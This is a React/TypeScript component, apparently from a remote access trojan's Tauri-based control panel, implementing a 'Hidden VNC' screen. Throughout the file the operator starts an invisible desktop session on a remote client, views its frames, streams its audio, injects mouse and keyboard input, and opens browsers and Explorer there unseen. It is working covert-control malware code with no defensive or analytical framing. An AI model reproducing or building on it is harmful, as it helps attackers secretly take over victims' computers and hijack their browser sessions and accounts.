import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import {
  manageHVNC,
  sendKeyboardInputCmd,
  sendMouseClickCmd,
  startHVNCFrameAudioCmd,
  stopHVNCFrameAudioCmd,
} from "../rat/RATCommands";
import {
  IconAdjustmentsAlt,
  IconInfoCircle,
  IconX,
  IconDeviceDesktopPlus,
  IconHandClick,
  IconKeyboard,
  IconBrowser,
  IconExternalLink,
  IconVolume,
  IconVolumeOff,
} from "@tabler/icons-react";
import { HVNCFramePayload } from "../../types";

export const HVNC = () => {
  const { addr } = useParams();
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastFrameRef = useRef<HTMLImageElement | null>(null);
  const isConnectedRef = useRef(false);

  const [showControls, setShowControls] = useState(true);
  const [showTooltip, setShowTooltip] = useState<string | null>(null);
  const [connectionStatus, setConnectionStatus] = useState<string>("Ready to connect");
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);
  const [mouseControlEnabled, setMouseControlEnabled] = useState(false);
  const [keyboardControlEnabled, setKeyboardControlEnabled] = useState(false);
  const [isMouseDown, setIsMouseDown] = useState(false);
  const [activeMouseButton, setActiveMouseButton] = useState<number | null>(null);
  const [capsLockState, setCapsLockState] = useState(false);
  const [ctrlKeyState, setCtrlKeyState] = useState(false);
  const [showInfoMessage, setShowInfoMessage] = useState(true);

  // Audio streaming state
  const [audioEnabled, setAudioEnabled] = useState(false);
  const audioContextRef = useRef<AudioContext | null>(null);
  const audioQueueRef = useRef<Float32Array[]>([]);
  const isPlayingRef = useRef(false);

  useEffect(() => {
    isConnectedRef.current = isConnected;
  }, [isConnected]);

  useEffect(() => {
    lastFrameRef.current = new Image();

    const unlisten = listen("hvnc_frame", (event: any) => {
      const payload = event.payload as HVNCFramePayload;
      if (payload.addr !== addr) return;

      if (!canvasRef.current || !lastFrameRef.current) return;

      const canvas = canvasRef.current;
      const ctx = canvas.getContext("2d");
      if (!ctx) return;

      const img = lastFrameRef.current;
      img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.drawImage(img, 0, 0, img.width, img.height);
      };
      img.onerror = () => {
        console.error("Failed to load HVNC frame image");
      };
      img.src = `data:image/jpeg;base64,${payload.data}`;

      setConnectionStatus("Connected");
      setIsConnected(true);
      setLoading(false);
    });

    return () => {
      unlisten.then((fn) => fn());
      if (isConnectedRef.current && addr) {
        manageHVNC(addr, "stop").catch(() => {});
      }
    };
  }, [addr]);

  useEffect(() => {
    if (!keyboardControlEnabled || !isConnected || !addr) return;

    const buildPayload = (event: KeyboardEvent, isKeydown: boolean) => {
      const keyCode = event.keyCode;
      let character = event.key;
      const shiftPressed = event.shiftKey;
      const ctrlPressed = event.ctrlKey;
      const capsLock = event.getModifierState("CapsLock");

      setCtrlKeyState(ctrlPressed);
      setCapsLockState(capsLock);

      const isSpecialKey =
        character.length > 1 ||
        (keyCode >= 33 && keyCode <= 40) ||
        keyCode === 13 ||
        keyCode === 8 ||
        keyCode === 9 ||
        keyCode === 27 ||
        keyCode === 46;

      if (isSpecialKey) {
        character = "";
      }

      return {
        keyCode,
        character,
        shiftPressed,
        ctrlPressed: ctrlPressed && !isSpecialKey,
        capsLock,
        isKeydown,
      };
    };

    const handleKeyDown = (event: KeyboardEvent) => {
      if (!addr) return;
      event.preventDefault();
      const payload = buildPayload(event, true);
      sendKeyboardInputCmd(
        addr,
        payload.keyCode,
        payload.character,
        payload.isKeydown,
        payload.shiftPressed,
        payload.ctrlPressed,
        payload.capsLock
      ).catch((error) => console.error("Error sending keyboard down event:", error));
    };

    const handleKeyUp = (event: KeyboardEvent) => {
      if (!addr) return;
      event.preventDefault();
      const payload = buildPayload(event, false);
      sendKeyboardInputCmd(
        addr,
        payload.keyCode,
        payload.character,
        payload.isKeydown,
        payload.shiftPressed,
        payload.ctrlPressed,
        payload.capsLock
      ).catch((error) => console.error("Error sending keyboard up event:", error));
    };

    document.addEventListener("keydown", handleKeyDown);
    document.addEventListener("keyup", handleKeyUp);

    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      document.removeEventListener("keyup", handleKeyUp);
      if (addr) {
        sendKeyboardInputCmd(addr, 0, "", false, false, false, false).catch(() => {});
      }
    };
  }, [keyboardControlEnabled, isConnected, addr]);

  // Audio streaming listener and playback
  useEffect(() => {
    if (!audioEnabled || !addr) return;

    const unlisten = listen("hvnc_frame_audio_chunk", (event: any) => {
      const payload = event.payload;
      if (payload.addr !== addr) return;

      try {
        const audioData = atob(payload.data);
        const bytes = new Uint8Array(audioData.length);
        for (let i = 0; i < audioData.length; i++) {
          bytes[i] = audioData.charCodeAt(i);
        }

        // Convert PCM i16 to Float32
        const samples = new Float32Array(bytes.length / 2);
        const dataView = new DataView(bytes.buffer);
        for (let i = 0; i < samples.length; i++) {
          samples[i] = dataView.getInt16(i * 2, true) / 32768.0;
        }

        audioQueueRef.current.push(samples);
        playNextAudioChunk(payload.sampleRate, payload.channels);
      } catch (e) {
        console.error("HVNC audio decode error:", e);
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, [audioEnabled, addr]);

  const playNextAudioChunk = (sampleRate: number, channels: number) => {
    if (isPlayingRef.current || audioQueueRef.current.length === 0) return;

    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new AudioContext({ sampleRate });
      }

      const ctx = audioContextRef.current;
      const samples = audioQueueRef.current.shift()!;

      const buffer = ctx.createBuffer(channels, samples.length, sampleRate);
      for (let ch = 0; ch < channels; ch++) {
        buffer.copyToChannel(samples, ch);
      }

      const source = ctx.createBufferSource();
      source.buffer = buffer;
      source.connect(ctx.destination);
      source.onended = () => {
        isPlayingRef.current = false;
        playNextAudioChunk(sampleRate, channels);
      };

      isPlayingRef.current = true;
      source.start();
    } catch (e) {
      console.error("HVNC audio playback error:", e);
      isPlayingRef.current = false;
    }
  };

  const toggleAudio = async () => {
    if (!addr) return;

    if (audioEnabled) {
      await stopHVNCFrameAudioCmd(addr);
      setAudioEnabled(false);

      // Cleanup audio context
      if (audioContextRef.current) {
        audioContextRef.current.close();
        audioContextRef.current = null;
      }
      audioQueueRef.current = [];
      isPlayingRef.current = false;
    } else {
      await startHVNCFrameAudioCmd(addr);
      setAudioEnabled(true);
    }
  };

  const startHVNC = async () => {
    if (!addr) return;

    setLoading(true);
    setConnectionStatus("Connecting...");

    try {
      await manageHVNC(addr, "start");
      setIsConnected(true);
    } catch (error) {
      console.error("Failed to start HVNC:", error);
      setLoading(false);
      setConnectionStatus("Connection failed");
    }

    setTimeout(() => {
      if (loading) {
        setLoading(false);
        setConnectionStatus("Connection timed out");
      }
    }, 10000);
  };

  const stopHVNC = async () => {
    if (!addr) return;

    try {
      await manageHVNC(addr, "stop");
    } catch (error) {
      console.error("Failed to stop HVNC:", error);
    } finally {
      setIsConnected(false);
      setLoading(false);
      setMouseControlEnabled(false);
      setKeyboardControlEnabled(false);
      setConnectionStatus("Ready to connect");
    }
  };

  const getCanvasCoordinates = (clientX: number, clientY: number) => {
    const canvas = canvasRef.current;
    if (!canvas) {
      return { x: 0, y: 0 };
    }

    const rect = canvas.getBoundingClientRect();
    const x = Math.round(((clientX - rect.left) / rect.width) * canvas.width);
    const y = Math.round(((clientY - rect.top) / rect.height) * canvas.height);
    return { x, y };
  };

  const handleMouseDown = async (event: React.MouseEvent<HTMLCanvasElement>) => {
    if (!mouseControlEnabled || !isConnected || !addr) return;
    if (event.button !== 0 && event.button !== 1 && event.button !== 2) return;

    event.preventDefault();
    setIsMouseDown(true);
    setActiveMouseButton(event.button);

    const coords = getCanvasCoordinates(event.clientX, event.clientY);
    await sendMouseClickCmd(addr, 0, coords.x, coords.y, event.button, 1, 0);
  };

  const handleMouseUp = async (event: React.MouseEvent<HTMLCanvasElement>) => {
    if (!mouseControlEnabled || !isConnected || !addr || !isMouseDown) return;
    event.preventDefault();
    setIsMouseDown(false);
    setActiveMouseButton(null);

    const coords = getCanvasCoordinates(event.clientX, event.clientY);
    await sendMouseClickCmd(addr, 0, coords.x, coords.y, event.button, 2, 0);
  };

  const handleMouseMove = async (event: React.MouseEvent<HTMLCanvasElement>) => {
    if (!mouseControlEnabled || !isConnected || !addr || !isMouseDown) return;
    const coords = getCanvasCoordinates(event.clientX, event.clientY);
    await sendMouseClickCmd(addr, 0, coords.x, coords.y, activeMouseButton ?? 0, 3, 0);
  };

  const handleWheel = async (event: React.WheelEvent<HTMLCanvasElement>) => {
    if (!mouseControlEnabled || !isConnected || !addr) return;
    event.preventDefault();

    const coords = getCanvasCoordinates(event.clientX, event.clientY);
    const scrollAmount = Math.max(1, Math.min(10, Math.abs(Math.round(event.deltaY / 100))));
    const actionType = event.deltaY < 0 ? 4 : 5;

    await sendMouseClickCmd(addr, 0, coords.x, coords.y, 3, actionType, scrollAmount);
  };

  const showToolTip = (tip: string) => {
    setShowTooltip(tip);
  };

  const toggleControls = () => {
    setShowControls(!showControls);
  };

  if (!addr) {
    return (
      <div className="p-6 flex flex-col items-center justify-center h-full text-white">
        <h1 className="text-2xl font-bold mb-4">HVNC</h1>
        <p>No client selected. Please select a client from the client list.</p>
      </div>
    );
  }

  return (
    <div className="relative w-screen h-screen bg-black text-white overflow-hidden">
      <div className="fixed top-4 left-4 z-10 flex flex-col gap-3">
        <button
          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 ${
            !showControls ? "bg-secondarybg bg-opacity-80" : "bg-white bg-opacity-90"
          }`}
          onClick={toggleControls}
          onMouseEnter={() => showToolTip(showControls ? "Hide Controls" : "Show Controls")}
          onMouseLeave={() => setShowTooltip(null)}
        >
          <IconAdjustmentsAlt
            size={24}
            className="transition-transform duration-300"
            style={{ transform: showControls ? "rotate(180deg)" : "rotate(0)" }}
            color={!showControls ? "white" : "black"}
          />
        </button>
      </div>

      {showTooltip && (
        <div className="fixed top-4 left-20 z-20 bg-black bg-opacity-90 text-white px-3 py-2 rounded-lg text-sm shadow-lg">
          {showTooltip}
        </div>
      )}

      {showControls && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md p-4 rounded-xl shadow-xl max-w-3xl w-full">
          <div className="flex flex-col gap-4">
            <div className="flex items-center justify-between gap-4">
              <div className="flex items-center gap-2">
                <IconDeviceDesktopPlus size={20} className="text-accentx" />
                <div>
                  <h3 className="text-base font-medium">Hidden VNC</h3>
                  <p className="text-xs text-gray-300">Stream and control a hidden desktop session on the remote client.</p>
                </div>
              </div>
              <div className="flex items-center gap-2 flex-wrap">
                {keyboardControlEnabled && (
                  <span className={`text-xs px-2 py-1 rounded-md font-medium ${ctrlKeyState ? "bg-green-500 text-white" : "bg-gray-700 text-gray-300"}`}>
                    CTRL
                  </span>
                )}
                {keyboardControlEnabled && (
                  <span className={`text-xs px-2 py-1 rounded-md font-medium ${capsLockState ? "bg-green-500 text-white" : "bg-gray-700 text-gray-300"}`}>
                    CAPS
                  </span>
                )}
                {audioEnabled && (
                  <span className="text-xs px-2 py-1 rounded-md font-medium bg-blue-500 text-white">
                    AUDIO
                  </span>
                )}
                <span
                  className={`text-xs px-3 py-1 rounded-md font-medium ${
                    connectionStatus === "Connected"
                      ? "bg-green-500 text-white"
                      : connectionStatus === "Connecting..."
                      ? "bg-yellow-500 text-black"
                      : connectionStatus === "Connection failed" || connectionStatus === "Connection timed out"
                      ? "bg-red-500 text-white"
                      : "bg-gray-700 text-white"
                  }`}
                >
                  {connectionStatus}
                </span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
              <button
                className={`text-sm py-3 rounded-xl border transition-all duration-200 font-semibold ${
                  isConnected
                    ? "border-red-500 bg-red-500 bg-opacity-40 text-white hover:bg-opacity-60"
                    : "border-green-500 bg-green-500 bg-opacity-40 text-white hover:bg-opacity-60"
                }`}
                onClick={isConnected ? stopHVNC : startHVNC}
                disabled={loading}
              >
                {isConnected ? "Stop HVNC" : loading ? "Connecting..." : "Start HVNC"}
              </button>
              <button
                className={`text-sm py-3 rounded-xl border transition-all duration-200 font-semibold ${
                  mouseControlEnabled
                    ? "border-white bg-white text-black"
                    : "border-secondarybg bg-secondarybg bg-opacity-80 text-white"
                } ${!isConnected ? "opacity-50 cursor-not-allowed" : ""}`}
                onClick={() => setMouseControlEnabled(!mouseControlEnabled)}
                disabled={!isConnected}
              >
                <IconHandClick size={16} className="inline-block mr-2" />
                {mouseControlEnabled ? "Mouse Enabled" : "Mouse Disabled"}
              </button>
              <button
                className={`text-sm py-3 rounded-xl border transition-all duration-200 font-semibold ${
                  keyboardControlEnabled
                    ? "border-white bg-white text-black"
                    : "border-secondarybg bg-secondarybg bg-opacity-80 text-white"
                } ${!isConnected ? "opacity-50 cursor-not-allowed" : ""}`}
                onClick={() => setKeyboardControlEnabled(!keyboardControlEnabled)}
                disabled={!isConnected}
              >
                <IconKeyboard size={16} className="inline-block mr-2" />
                {keyboardControlEnabled ? "Keyboard Enabled" : "Keyboard Disabled"}
              </button>
              <button
                className={`text-sm py-3 rounded-xl border transition-all duration-200 font-semibold ${
                  audioEnabled
                    ? "border-white bg-white text-black"
                    : "border-secondarybg bg-secondarybg bg-opacity-80 text-white"
                } ${!isConnected ? "opacity-50 cursor-not-allowed" : ""}`}
                onClick={toggleAudio}
                disabled={!isConnected}
              >
                {audioEnabled ? (
                  <IconVolume size={16} className="inline-block mr-2" />
                ) : (
                  <IconVolumeOff size={16} className="inline-block mr-2" />
                )}
                {audioEnabled ? "Audio On" : "Audio Off"}
              </button>
            </div>

            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <button
                className="text-sm py-3 rounded-xl border border-blue-500 bg-blue-500 bg-opacity-40 text-white hover:bg-opacity-60 transition-all duration-200"
                onClick={() => addr && manageHVNC(addr, "open_explorer")}
                disabled={!isConnected}
              >
                <IconExternalLink size={16} className="inline-block mr-2" />
                Explorer
              </button>
              <button
                className="text-sm py-3 rounded-xl border border-blue-500 bg-blue-500 bg-opacity-40 text-white hover:bg-opacity-60 transition-all duration-200"
                onClick={() => addr && manageHVNC(addr, "open_chrome")}
                disabled={!isConnected}
              >
                <IconBrowser size={16} className="inline-block mr-2" />
                Chrome
              </button>
              <button
                className="text-sm py-3 rounded-xl border border-blue-500 bg-blue-500 bg-opacity-40 text-white hover:bg-opacity-60 transition-all duration-200"
                onClick={() => addr && manageHVNC(addr, "open_firefox")}
                disabled={!isConnected}
              >
                <IconBrowser size={16} className="inline-block mr-2" />
                Firefox
              </button>
              <button
                className="text-sm py-3 rounded-xl border border-blue-500 bg-blue-500 bg-opacity-40 text-white hover:bg-opacity-60 transition-all duration-200"
                onClick={() => addr && manageHVNC(addr, "open_edge")}
                disabled={!isConnected}
              >
                <IconBrowser size={16} className="inline-block mr-2" />
                Edge
              </button>
            </div>

            <div className="grid grid-cols-1 gap-3">
              <button
                className="text-sm py-3 rounded-xl border border-gray-600 bg-gray-700 bg-opacity-40 text-white hover:bg-opacity-60 transition-all duration-200"
                onClick={() => {
                  setMouseControlEnabled(false);
                  setKeyboardControlEnabled(false);
                  setAudioEnabled(false);
                  setConnectionStatus("Ready to connect");
                }}
              >
                Reset Controls
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="relative flex-1 flex items-center justify-center w-full h-full px-4 pb-4">
        <canvas
          ref={canvasRef}
          width={1280}
          height={720}
          className="max-w-full max-h-full bg-black rounded-2xl border border-white/10 shadow-xl"
          onMouseDown={handleMouseDown}
          onMouseUp={handleMouseUp}
          onMouseMove={handleMouseMove}
          onWheel={handleWheel}
          tabIndex={0}
        />
      </div>

      {!isConnected && !loading && showInfoMessage && (
        <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 z-10 bg-primarybg bg-opacity-90 backdrop-blur-md px-4 py-3 rounded-xl shadow-xl text-white max-w-3xl flex items-center gap-3">
          <IconInfoCircle size={18} className="text-accentx shrink-0" />
          <p className="text-sm leading-snug">
            Hidden VNC creates an invisible desktop session on the remote client, streams its framebuffer,
            and forwards your mouse and keyboard commands into that hidden environment.
          </p>
          <button
            className="ml-auto text-gray-300 hover:text-white"
            onClick={() => setShowInfoMessage(false)}
          >
            <IconX size={18} />
          </button>
        </div>
      )}
    </div>
  );
};
